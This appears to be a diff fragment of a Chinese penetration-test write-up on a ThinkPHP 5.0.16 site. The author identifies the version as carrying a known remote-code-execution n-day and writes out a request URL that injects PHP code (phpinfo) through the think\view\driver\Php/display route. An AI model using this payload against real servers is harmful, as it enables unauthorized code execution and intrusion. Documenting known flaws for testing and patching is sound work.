@@ -17,6 +17,7 @@ tp的框架，emm,先看下版本，直接添加路径致报错查看版本号
 
 tp5.0.16,这个版本的tp有rce的nday,
 
+
 尝试添加默认路由
 
 `/public/index.php/index/index/index?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>`
